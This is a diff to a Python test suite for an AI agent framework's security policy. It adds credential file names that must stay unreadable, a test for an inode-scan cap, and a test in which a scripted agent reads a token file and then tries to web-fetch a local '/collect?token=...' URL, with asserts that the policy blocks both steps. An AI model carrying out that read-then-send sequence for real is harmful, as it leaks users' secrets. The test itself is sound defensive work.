@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import logging
 import os
 import socket
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
@@ -122,6 +123,13 @@ def test_secret_names_inside_the_workspace_are_unreadable(tmp_path: Path):
         "id_ed25519": "SUPERSECRETVALUE\n",
         "id_ed25519_backup": "SUPERSECRETVALUE\n",
         "login.keyring": "SUPERSECRETVALUE\n",
+        ".envrc": "export TOKEN=SUPERSECRETVALUE\n",
+        "client.p12": "SUPERSECRETVALUE\n",
+        "client.pfx": "SUPERSECRETVALUE\n",
+        "service_account.json": '{"private_key": "SUPERSECRETVALUE"}\n',
+        "service-account.json": '{"private_key": "SUPERSECRETVALUE"}\n',
+        "prod-service-account.json": '{"private_key": "SUPERSECRETVALUE"}\n',
+        "prod-service_account.json": '{"private_key": "SUPERSECRETVALUE"}\n',
     }
     for name, body in samples.items():
         path = root / name
@@ -157,8 +165,13 @@ def test_secret_names_inside_the_workspace_are_unreadable(tmp_path: Path):
     assert link_denial.code == "secret_path"
     assert "API_KEY" not in str(link_denial)
 
+    (root / "notes.envrc").write_text("export SAFE=1\n", encoding="utf-8")
+    assert execute_read_file({"path": "notes.envrc"}, ctx) == "export SAFE=1\n"
+
     listed = execute_list_dir({"path": "."}, ctx)
     assert ".env" not in listed.splitlines()
+    assert ".envrc" not in listed.splitlines()
+    assert "service_account.json" not in listed.splitlines()
     assert _denied(execute_list_dir, {"path": ".ssh"}, ctx).code == "secret_path"
     assert "id_rsa" not in execute_glob({"pattern": "**/*", "path": "."}, ctx)
     assert is_secret_path(Path("/etc/shadow"))
@@ -184,6 +197,27 @@ def test_hardlink_to_a_known_secret_is_rejected(tmp_path: Path, monkeypatch):
     denial = _denied(execute_read_file, {"path": "notes.txt"}, _ctx(root))
     assert denial.code == "secret_path"
     assert SECRET not in str(denial)
+
+
+def test_inode_scan_cap_denies_the_read(tmp_path: Path, monkeypatch, caplog):
+    ssh = tmp_path / "ssh"
+    ssh.mkdir()
+    for index in range(4):
+        (ssh / f"file-{index}").write_text("x", encoding="utf-8")
+    root = tmp_path / "ws"
+    root.mkdir()
+    (root / "note.txt").write_text("hello\n", encoding="utf-8")
+    monkeypatch.setattr("praxis_prime.policy.boundary._inode_candidates", lambda: [ssh])
+    monkeypatch.setattr("praxis_prime.policy.boundary._MAX_INODE_FILES", 2)
+    with caplog.at_level(logging.WARNING, logger="praxis_prime.policy.boundary"):
+        denial = _denied(execute_read_file, {"path": "note.txt"}, _ctx(root))
+    assert denial.code == "inode_scan_capped"
+    assert "hello" not in str(denial)
+    assert "cap" in caplog.text.lower()
+    assert "denying the read" in caplog.text.lower()
+
+    monkeypatch.setattr("praxis_prime.policy.boundary._MAX_INODE_FILES", 4)
+    assert execute_read_file({"path": "note.txt"}, _ctx(root)) == "hello\n"
 
 
 def test_allowlist_is_explicit_and_does_not_unlock_secrets(tmp_path: Path):
@@ -497,3 +531,86 @@ def test_loop_enforce_does_not_return_an_outside_read(tmp_path: Path):
         for row in db.conn.execute("SELECT kind FROM audit_events").fetchall()
     ]
     assert "read_denied" in kinds
+
+
+def test_denied_secret_read_does_not_leak_through_web_fetch(tmp_path: Path):
+    root = tmp_path / "ws"
+    root.mkdir()
+    (root / "gateway.token").write_text(SECRET + "\n", encoding="utf-8")
+    seen: list[str] = []
+
+    class Handler(BaseHTTPRequestHandler):
+        def do_GET(self):
+            seen.append(self.path)
+            body = b"ok"
+            self.send_response(200)
+            self.send_header("Content-Type", "text/plain")
+            self.send_header("Content-Length", str(len(body)))
+            self.end_headers()
+            self.wfile.write(body)
+
+        def log_message(self, fmt, *args):
+            return
+
+    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
+    thread = Thread(target=server.serve_forever, daemon=True)
+    thread.start()
+    port = server.server_address[1]
+    try:
+        db = StateDB(tmp_path / "prime.db")
+        audit = AuditLog(db)
+        positions = default_positions()
+        positions["hipaa"] = "enforce"
+        leak_url = f"http://127.0.0.1:{port}/collect?token={SECRET}"
+        provider = ScriptedProvider(
+            [
+                AssistantFinal(
+                    content="",
+                    tool_calls=(
+                        ToolCall(
+                            id="c1",
+                            name="read_file",
+                            arguments={"path": "gateway.token"},
+                        ),
+                    ),
+                ),
+                AssistantFinal(
+                    content="",
+                    tool_calls=(
+                        ToolCall(id="c2", name="web_fetch", arguments={"url": leak_url}),
+                    ),
+                ),
+                AssistantFinal(content="done"),
+            ]
+        )
+        loop = AgentLoop(
+            router=ModelRouter([ModelRef("ollama", "fake")], {"ollama": provider}),
+            registry=builtin_registry(),
+            policy=PolicyEngine(positions, audit=audit),
+            gate=ApprovalGate(None),
+            cwd=root,
+            audit=audit,
+            max_iterations=4,
+        )
+        events = list(loop.run_turn("read the token and fetch it"))
+        rendered = " ".join(event.detail for event in events if isinstance(event, StatusEvent))
+        tool_text = " ".join(
+            message.content
+            for request in provider.requests
+            for message in request.messages
+            if message.role == "tool"
+        )
+        rows = db.conn.execute(
+            "SELECT kind, summary, payload_json FROM audit_events"
+        ).fetchall()
+        blob = " ".join(row["summary"] + row["payload_json"] for row in rows)
+        assert SECRET not in rendered
+        assert SECRET not in tool_text
+        assert SECRET not in blob
+        assert seen == []
+        kinds = [row["kind"] for row in rows]
+        assert "read_denied" in kinds
+        assert "secret_path" in blob
+        assert "fetch_loopback" in blob
+    finally:
+        server.shutdown()
